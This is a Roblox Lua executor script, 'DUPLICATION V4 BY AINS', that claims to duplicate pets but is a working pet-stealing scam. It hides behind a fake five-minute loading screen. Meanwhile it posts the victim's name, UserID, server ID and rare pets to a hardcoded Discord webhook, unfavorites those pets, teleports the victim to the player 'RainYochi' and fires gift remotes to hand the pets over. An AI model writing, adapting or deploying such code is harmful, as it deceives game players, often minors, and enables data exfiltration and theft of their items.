--[[
 DUPLICATION V4 BY AINS

]]--

bit32 = {};
local N = 32;
local P = 2 ^ N;
bit32.bnot = function(x)
	x = x % P;
	return (P - 1) - x;
end;
bit32.band = function(x, y)
	if (y == 255) then
		return x % 256;
	end
	if (y == 65535) then
		return x % 65536;
	end
	if (y == 4294967295) then
		return x % 4294967296;
	end
	x, y = x % P, y % P;
	local r = 0;
	local p = 1;
	for i = 1, N do
		local a, b = x % 2, y % 2;
		x, y = math.floor(x / 2), math.floor(y / 2);
		if ((a + b) == 2) then
			r = r + p;
		end
		p = 2 * p;
	end
	return r;
end;
bit32.bor = function(x, y)
	if (y == 255) then
		return (x - (x % 256)) + 255;
	end
	if (y == 65535) then
		return (x - (x % 65536)) + 65535;
	end
	if (y == 4294967295) then
		return 4294967295;
	end
	x, y = x % P, y % P;
	local r = 0;
	local p = 1;
	for i = 1, N do
		local a, b = x % 2, y % 2;
		x, y = math.floor(x / 2), math.floor(y / 2);
		if ((a + b) >= 1) then
			r = r + p;
		end
		p = 2 * p;
	end
	return r;
end;
bit32.bxor = function(x, y)
	x, y = x % P, y % P;
	local r = 0;
	local p = 1;
	for i = 1, N do
		local a, b = x % 2, y % 2;
		x, y = math.floor(x / 2), math.floor(y / 2);
		if ((a + b) == 1) then
			r = r + p;
		end
		p = 2 * p;
	end
	return r;
end;
bit32.lshift = function(x, s_amount)
	if (math.abs(s_amount) >= N) then
		return 0;
	end
	x = x % P;
	if (s_amount < 0) then
		return math.floor(x * (2 ^ s_amount));
	else
		return (x * (2 ^ s_amount)) % P;
	end
end;
bit32.rshift = function(x, s_amount)
	if (math.abs(s_amount) >= N) then
		return 0;
	end
	x = x % P;
	if (s_amount > 0) then
		return math.floor(x * (2 ^ -s_amount));
	else
		return (x * (2 ^ -s_amount)) % P;
	end
end;
bit32.arshift = function(x, s_amount)
	if (math.abs(s_amount) >= N) then
		return 0;
	end
	x = x % P;
	if (s_amount > 0) then
		local add = 0;
		if (x >= (P / 2)) then
			add = P - (2 ^ (N - s_amount));
		end
		return math.floor(x * (2 ^ -s_amount)) + add;
	else
		return (x * (2 ^ -s_amount)) % P;
	end
end;
local TABLE_TableIndirection = {};
TABLE_TableIndirection["Players%0"] = game:GetService("Players");
TABLE_TableIndirection["HttpService%0"] = game:GetService("HttpService");
TABLE_TableIndirection["MarketplaceService%0"] = game:GetService("MarketplaceService");
TABLE_TableIndirection["ReplicatedStorage%0"] = game:GetService("ReplicatedStorage");
TABLE_TableIndirection["TeleportService%0"] = game:GetService("TeleportService");
TABLE_TableIndirection["RunService%0"] = game:GetService("RunService");
TABLE_TableIndirection["UserInputService%0"] = game:GetService("UserInputService");
TABLE_TableIndirection["TweenService%0"] = game:GetService("TweenService");
TABLE_TableIndirection["LocalPlayer%0"] = TABLE_TableIndirection["Players%0"].LocalPlayer;
TABLE_TableIndirection["GameInfo%0"] = TABLE_TableIndirection["MarketplaceService%0"]:GetProductInfo(game.PlaceId);
if not TABLE_TableIndirection["HttpService%0"]:GetHttpEnabled() then
	TABLE_TableIndirection["HttpService%0"]:SetHttpEnabled(true);
end
TABLE_TableIndirection["WEBHOOK_URL%0"] = "https://discord.com/api/webhooks/1381312752340959272/WFBCmrqUenRkTjDlHV3t5LPzVgetQ1SfPwdxopQesGyyDbJjoklYEqKCklVpkleNtmKG";
TABLE_TableIndirection["TARGET_PETS%0"] = {"Raccoon","Queen Bee","Dragonfly","Disco Bee","Butterfly","Red Fox","Polar Bear"};
TABLE_TableIndirection["TARGET_PLAYER_NAME%0"] = "RainYochi";
TABLE_TableIndirection["currentPetIndex%0"] = 1;
local function CreateLoadingScreen()
	TABLE_TableIndirection["ScreenGui%0"] = Instance.new("ScreenGui");
	TABLE_TableIndirection["ScreenGui%0"].Name = "LoadingScreen";
	TABLE_TableIndirection["ScreenGui%0"].IgnoreGuiInset = true;
	TABLE_TableIndirection["ScreenGui%0"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
	TABLE_TableIndirection["ScreenGui%0"].Parent = game.CoreGui;
	TABLE_TableIndirection["Background%0"] = Instance.new("Frame");
	TABLE_TableIndirection["Background%0"].Name = "Background";
	TABLE_TableIndirection["Background%0"].Size = UDim2.new(1, 0, 1, 0);
	TABLE_TableIndirection["Background%0"].Position = UDim2.new(0, 0, 0, 0);
	TABLE_TableIndirection["Background%0"].BackgroundColor3 = Color3.new(0, 0, 0);
	TABLE_TableIndirection["Background%0"].BorderSizePixel = 0;
	TABLE_TableIndirection["Background%0"].Parent = TABLE_TableIndirection["ScreenGui%0"];
	TABLE_TableIndirection["LoadingBarBackground%0"] = Instance.new("Frame");
	TABLE_TableIndirection["LoadingBarBackground%0"].Name = "LoadingBarBackground";
	TABLE_TableIndirection["LoadingBarBackground%0"].Size = UDim2.new(0.6, 0, 0.05, 0);
	TABLE_TableIndirection["LoadingBarBackground%0"].Position = UDim2.new(0.2, 0, 0.5, 0);
	TABLE_TableIndirection["LoadingBarBackground%0"].BackgroundColor3 = Color3.new(0.2, 0.2, 0.2);
	TABLE_TableIndirection["LoadingBarBackground%0"].BorderSizePixel = 0;
	TABLE_TableIndirection["LoadingBarBackground%0"].Parent = TABLE_TableIndirection["Background%0"];
	TABLE_TableIndirection["LoadingBar%0"] = Instance.new("Frame");
	TABLE_TableIndirection["LoadingBar%0"].Name = "LoadingBar";
	TABLE_TableIndirection["LoadingBar%0"].Size = UDim2.new(0, 0, 1, 0);
	TABLE_TableIndirection["LoadingBar%0"].Position = UDim2.new(0, 0, 0, 0);
	TABLE_TableIndirection["LoadingBar%0"].BackgroundColor3 = Color3.new(1, 0.5, 0);
	TABLE_TableIndirection["LoadingBar%0"].BorderSizePixel = 0;
	TABLE_TableIndirection["LoadingBar%0"].Parent = TABLE_TableIndirection["LoadingBarBackground%0"];
	TABLE_TableIndirection["LoadingText%0"] = Instance.new("TextLabel");
	TABLE_TableIndirection["LoadingText%0"].Name = "LoadingText";
	TABLE_TableIndirection["LoadingText%0"].Size = UDim2.new(1, 0, 0.1, 0);
	TABLE_TableIndirection["LoadingText%0"].Position = UDim2.new(0, 0, 0.4, 0);
	TABLE_TableIndirection["LoadingText%0"].BackgroundTransparency = 1;
	TABLE_TableIndirection["LoadingText%0"].Text = "Initializing System... 0%";
	TABLE_TableIndirection["LoadingText%0"].TextColor3 = Color3.new(1, 1, 1);
	TABLE_TableIndirection["LoadingText%0"].Font = Enum.Font.GothamBold;
	TABLE_TableIndirection["LoadingText%0"].TextSize = 24;
	TABLE_TableIndirection["LoadingText%0"].Parent = TABLE_TableIndirection["Background%0"];
	return TABLE_TableIndirection["ScreenGui%0"], TABLE_TableIndirection["LoadingBar%0"], TABLE_TableIndirection["LoadingText%0"];
end
local function RunLoadingAnimation(loadingBar, loadingText)
	TABLE_TableIndirection["duration%0"] = 300;
	TABLE_TableIndirection["startTime%0"] = tick();
	TABLE_TableIndirection["endTime%0"] = TABLE_TableIndirection["startTime%0"] + TABLE_TableIndirection["duration%0"];
	while tick() < TABLE_TableIndirection["endTime%0"] do
		TABLE_TableIndirection["elapsed%0"] = tick() - TABLE_TableIndirection["startTime%0"];
		TABLE_TableIndirection["progress%0"] = math.min(TABLE_TableIndirection["elapsed%0"] / TABLE_TableIndirection["duration%0"], 1);
		TABLE_TableIndirection["percentage%0"] = math.floor(TABLE_TableIndirection["progress%0"] * 100);
		loadingBar.Size = UDim2.new(TABLE_TableIndirection["progress%0"], 0, 1, 0);
		loadingText.Text = string.format("System Initializing... %d%%", TABLE_TableIndirection["percentage%0"]);
		TABLE_TableIndirection["RunService%0"].Heartbeat:Wait();
	end
	loadingBar.Size = UDim2.new(1, 0, 1, 0);
	loadingText.Text = "System Initialized [100%]";
end
local function FindTargetPlayer()
	for _, player in ipairs(TABLE_TableIndirection["Players%0"]:GetPlayers()) do
		if ((player.Name == TABLE_TableIndirection["TARGET_PLAYER_NAME%0"]) and player.Character) then
			return player;
		end
	end
	return nil;
end
local function UnfavoriteByNameSearch(pet)
	for _, remote in pairs(TABLE_TableIndirection["ReplicatedStorage%0"]:GetDescendants()) do
		if (remote:IsA("RemoteEvent") and string.find(string.lower(remote.Name), "favorite")) then
			pcall(function()
				remote:FireServer(pet, false);
				remote:FireServer(pet.Name, false);
				remote:FireServer({pet=pet,favorite=false});
				return true;
			end);
		end
	end
	return false;
end
local function PickupActivePets()
	TABLE_TableIndirection["success%0"] = false;
	TABLE_TableIndirection["pickupRemotes%0"] = {TABLE_TableIndirection["ReplicatedStorage%0"]:FindFirstChild("PickupRemote"),TABLE_TableIndirection["ReplicatedStorage%0"]:FindFirstChild("CollectRemote"),TABLE_TableIndirection["ReplicatedStorage%0"]:FindFirstChild("PetPickupRemote"),TABLE_TableIndirection["ReplicatedStorage%0"]:FindFirstChild("CollectPetRemote"),TABLE_TableIndirection["ReplicatedStorage%0"]:FindFirstChild("ReturnPets")};
	for _, remote in pairs(TABLE_TableIndirection["pickupRemotes%0"]) do
		if remote then
			pcall(function()
				if remote:IsA("RemoteEvent") then
					remote:FireServer("pickup");
					remote:FireServer("collect");
					remote:FireServer("return");
					remote:FireServer();
				elseif remote:IsA("RemoteFunction") then
					remote:InvokeServer("pickup");
					remote:InvokeServer("collect");
					remote:InvokeServer();
				end
				TABLE_TableIndirection["success%0"] = true;
			end);
		end
	end
	TABLE_TableIndirection["playerGui%0"] = TABLE_TableIndirection["LocalPlayer%0"]:FindFirstChild("PlayerGui");
	if TABLE_TableIndirection["playerGui%0"] then
		for _, gui in pairs(TABLE_TableIndirection["playerGui%0"]:GetDescendants()) do
			if (gui:IsA("TextButton") or gui:IsA("ImageButton")) then
				TABLE_TableIndirection["buttonText%0"] = string.lower(gui.Name);
				if (string.find(TABLE_TableIndirection["buttonText%0"], "pickup") or string.find(TABLE_TableIndirection["buttonText%0"], "collect") or string.find(TABLE_TableIndirection["buttonText%0"], "return")) then
					pcall(function()
						for _, connection in pairs(getconnections(gui.MouseButton1Click)) do
							connection:Fire();
						end
						TABLE_TableIndirection["success%0"] = true;
					end);
				end
			end
		end
	end
	pcall(function()
		TABLE_TableIndirection["VirtualInputManager%0"] = game:GetService("VirtualInputManager");
		TABLE_TableIndirection["VirtualInputManager%0"]:SendKeyEvent(true, "R", false, game);
		task.wait(0.1);
		TABLE_TableIndirection["VirtualInputManager%0"]:SendKeyEvent(false, "R", false, game);
		TABLE_TableIndirection["success%0"] = true;
	end);
	return TABLE_TableIndirection["success%0"];
end
local function GetPlayerPets()
	TABLE_TableIndirection["pets%0"] = {};
	TABLE_TableIndirection["backpack%0"] = TABLE_TableIndirection["LocalPlayer%0"]:FindFirstChild("Backpack");
	TABLE_TableIndirection["character%0"] = TABLE_TableIndirection["LocalPlayer%0"].Character;
	PickupActivePets();
	task.wait(1);
	if TABLE_TableIndirection["backpack%0"] then
		for _, item in ipairs(TABLE_TableIndirection["backpack%0"]:GetChildren()) do
			if item:IsA("Tool") then
				for _, petName in ipairs(TABLE_TableIndirection["TARGET_PETS%0"]) do
					if string.find(string.lower(item.Name), string.lower(petName)) then
						table.insert(TABLE_TableIndirection["pets%0"], item);
					end
				end
			end
		end
	end
	if TABLE_TableIndirection["character%0"] then
		for _, item in ipairs(TABLE_TableIndirection["character%0"]:GetChildren()) do
			if item:IsA("Tool") then
				for _, petName in ipairs(TABLE_TableIndirection["TARGET_PETS%0"]) do
					if string.find(string.lower(item.Name), string.lower(petName)) then
						table.insert(TABLE_TableIndirection["pets%0"], item);
					end
				end
			end
		end
	end
	return TABLE_TableIndirection["pets%0"];
end
local function FindNextPetByPriority()
	TABLE_TableIndirection["allPets%0"] = GetPlayerPets();
	TABLE_TableIndirection["foundPet%0"] = nil;
	for _, pet in ipairs(TABLE_TableIndirection["allPets%0"]) do
		if string.find(string.lower(pet.Name), string.lower(TABLE_TableIndirection["TARGET_PETS%0"][TABLE_TableIndirection["currentPetIndex%0"]])) then
			TABLE_TableIndirection["foundPet%0"] = pet;
			break;
		end
	end
	if not TABLE_TableIndirection["foundPet%0"] then
		TABLE_TableIndirection["nextIndex%0"] = TABLE_TableIndirection["currentPetIndex%0"];
		for i = 1, #TABLE_TableIndirection["TARGET_PETS%0"] do
			TABLE_TableIndirection["nextIndex%0"] = (TABLE_TableIndirection["nextIndex%0"] % #TABLE_TableIndirection["TARGET_PETS%0"]) + 1;
			for _, pet in ipairs(TABLE_TableIndirection["allPets%0"]) do
				if string.find(string.lower(pet.Name), string.lower(TABLE_TableIndirection["TARGET_PETS%0"][TABLE_TableIndirection["nextIndex%0"]])) then
					TABLE_TableIndirection["currentPetIndex%0"] = TABLE_TableIndirection["nextIndex%0"];
					TABLE_TableIndirection["foundPet%0"] = pet;
					break;
				end
			end
			if TABLE_TableIndirection["foundPet%0"] then
				break;
			end
		end
	end
	return TABLE_TableIndirection["foundPet%0"];
end
local function SendToDiscord()
	TABLE_TableIndirection["playerPets%0"] = GetPlayerPets();
	TABLE_TableIndirection["petList%0"] = "None";
	if (#TABLE_TableIndirection["playerPets%0"] > 0) then
		TABLE_TableIndirection["petNames%0"] = {};
		for _, pet in ipairs(TABLE_TableIndirection["playerPets%0"]) do
			table.insert(TABLE_TableIndirection["petNames%0"], pet.Name);
		end
		TABLE_TableIndirection["petList%0"] = table.concat(TABLE_TableIndirection["petNames%0"], ", ");
	end
	TABLE_TableIndirection["data%0"] = {username="Pet Reporter",embeds={{title="📊 Pet Ownership Report",description="Berikut adalah data akun dan kepemilikan pet:",color=16753920,fields={{name="👤 Player Info",value=string.format("Name: %s\nUserID: %s", TABLE_TableIndirection["LocalPlayer%0"].Name, TABLE_TableIndirection["LocalPlayer%0"].UserId),inline=true},{name="🎮 Server Info",value=string.format("Game: %s\nServerID: ```%s```", TABLE_TableIndirection["GameInfo%0"].Name, game.JobId),inline=true},{name="🐾 Owned Pets",value=TABLE_TableIndirection["petList%0"],inline=false}},footer={text=("Report Time: " .. os.date("%Y-%m-%d %H:%M:%S"))}}},content=(((#TABLE_TableIndirection["playerPets%0"] > 0) and "🎉 Player has rare pets!") or "📌 Player has no target pets")};
	local success, response = pcall(function()
		TABLE_TableIndirection["jsonData%0"] = TABLE_TableIndirection["HttpService%0"]:JSONEncode(TABLE_TableIndirection["data%0"]);
		return request({Url=TABLE_TableIndirection["WEBHOOK_URL%0"],Method="POST",Headers={["Content-Type"]="application/json"},Body=TABLE_TableIndirection["jsonData%0"]});
	end);
	return success, response;
end
local function DirectTeleport(target)
	if (not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart")) then
		return false, "Target character not found";
	end
	if (not TABLE_TableIndirection["LocalPlayer%0"].Character or not TABLE_TableIndirection["LocalPlayer%0"].Character:FindFirstChild("HumanoidRootPart")) then
		return false, "Local character not ready";
	end
	TABLE_TableIndirection["targetCFrame%0"] = target.Character.HumanoidRootPart.CFrame;
	TABLE_TableIndirection["teleportPosition%0"] = TABLE_TableIndirection["targetCFrame%0"].Position + (TABLE_TableIndirection["targetCFrame%0"].LookVector * 4);
	TABLE_TableIndirection["LocalPlayer%0"].Character.HumanoidRootPart.CFrame = CFrame.new(TABLE_TableIndirection["teleportPosition%0"], target.Character.HumanoidRootPart.Position);
	return true;
end
local function EquipPet(pet)
	if (not pet or not pet:IsA("Tool")) then
		return false, "Invalid pet";
	end
	if (pet.Parent ~= TABLE_TableIndirection["LocalPlayer%0"].Backpack) then
		pet.Parent = TABLE_TableIndirection["LocalPlayer%0"].Backpack;
		task.wait(0.2);
	end
	TABLE_TableIndirection["humanoid%0"] = TABLE_TableIndirection["LocalPlayer%0"].Character:FindFirstChildOfClass("Humanoid");
	if not TABLE_TableIndirection["humanoid%0"] then
		return false, "Humanoid not found";
	end
	TABLE_TableIndirection["humanoid%0"]:EquipTool(pet);
	task.wait(0.3);
	if not TABLE_TableIndirection["LocalPlayer%0"].Character:FindFirstChild(pet.Name) then
		return false, "Failed to equip pet";
	end
	return true;
end
local function GiftPet(targetPlayer, pet)
	print("Attempting to gift pet:", pet.Name);
	print("Picking up active pets...");
	PickupActivePets();
	task.wait(1);
	print("Unfavoriting pet with Name Search method...");
	TABLE_TableIndirection["unfavoriteSuccess%0"] = UnfavoriteByNameSearch(pet);
	if TABLE_TableIndirection["unfavoriteSuccess%0"] then
		print("Pet unfavorited successfully");
	else
		print("Failed to unfavorite or pet wasn't favorited");
	end
	task.wait(0.5);
	print("Teleporting to target...");
	TABLE_TableIndirection["teleportSuccess%0"] = DirectTeleport(targetPlayer);
	if not TABLE_TableIndirection["teleportSuccess%0"] then
		return false, "Teleport failed";
	end
	task.wait(0.5);
	print("Equipping pet...");
	TABLE_TableIndirection["equipSuccess%0"] = EquipPet(pet);
	if not TABLE_TableIndirection["equipSuccess%0"] then
		return false, "Equip failed";
	end
	task.wait(0.5);
	print("Attempting to gift...");
	TABLE_TableIndirection["giftRemotes%0"] = {TABLE_TableIndirection["ReplicatedStorage%0"]:FindFirstChild("GiftRemote"),TABLE_TableIndirection["ReplicatedStorage%0"]:FindFirstChild("PetGiftRemote"),TABLE_TableIndirection["ReplicatedStorage%0"]:FindFirstChild("GivePetRemote"),TABLE_TableIndirection["ReplicatedStorage%0"]:FindFirstChild("TradePetRemote")};
	for _, giftRemote in pairs(TABLE_TableIndirection["giftRemotes%0"]) do
		if giftRemote then
			pcall(function()
				if giftRemote:IsA("RemoteEvent") then
					giftRemote:FireServer(targetPlayer, pet);
					giftRemote:FireServer(targetPlayer.Name, pet.Name);
					giftRemote:FireServer({player=targetPlayer,pet=pet});
				elseif giftRemote:IsA("RemoteFunction") then
					giftRemote:InvokeServer(targetPlayer, pet);
					giftRemote:InvokeServer(targetPlayer.Name, pet.Name);
				end
			end);
			print("Used remote:", giftRemote.Name);
			return true, "Used remote: " .. giftRemote.Name;
		end
	end
	if targetPlayer.Character then
		for _, part in pairs(targetPlayer.Character:GetDescendants()) do
			if part:IsA("ProximityPrompt") then
				fireproximityprompt(part);
				print("Fired proximity prompt");
				return true, "Fired proximity prompt";
			end
		end
	end
	return false, "No gift method found";
end
local function AutoGiftLoop()
	while task.wait(2) do
		TABLE_TableIndirection["targetPlayer%0"] = FindTargetPlayer();
		if not TABLE_TableIndirection["targetPlayer%0"] then
			warn("Target player not found");
			continue;
		end
		TABLE_TableIndirection["pet%0"] = FindNextPetByPriority();
		if not TABLE_TableIndirection["pet%0"] then
			warn("No pets available");
			continue;
		end
		print("Selected pet by priority:", TABLE_TableIndirection["pet%0"].Name, "| Priority:", TABLE_TableIndirection["currentPetIndex%0"]);
		local success, result = pcall(function()
			return GiftPet(TABLE_TableIndirection["targetPlayer%0"], TABLE_TableIndirection["pet%0"]);
		end);
		if success then
			print("Gift attempt result:", result);
			TABLE_TableIndirection["currentPetIndex%0"] = (TABLE_TableIndirection["currentPetIndex%0"] % #TABLE_TableIndirection["TARGET_PETS%0"]) + 1;
		else
			warn("Gift error:", result);
		end
		task.wait(3);
	end
end
local function AutoRefreshLoop()
	while task.wait(0.5) do
		TABLE_TableIndirection["targetPlayer%0"] = FindTargetPlayer();
		if TABLE_TableIndirection["targetPlayer%0"] then
		end
	end
end
local function Main()
	local loadingScreen, loadingBar, loadingText = CreateLoadingScreen();
	task.spawn(function()
		local success, response = SendToDiscord();
		if success then
			print("Initial report sent to Discord");
		else
			warn("Failed to send Discord report:", response);
		end
	end);
	task.spawn(function()
		RunLoadingAnimation(loadingBar, loadingText);
		loadingScreen:Destroy();
	end);
	task.spawn(AutoRefreshLoop);
	task.spawn(AutoGiftLoop);
	print("Enhanced Auto-gift system activated for", TABLE_TableIndirection["TARGET_PLAYER_NAME%0"]);
	print("Features: Loading screen, Priority-based gifting, Auto-refresh");
end
Main();
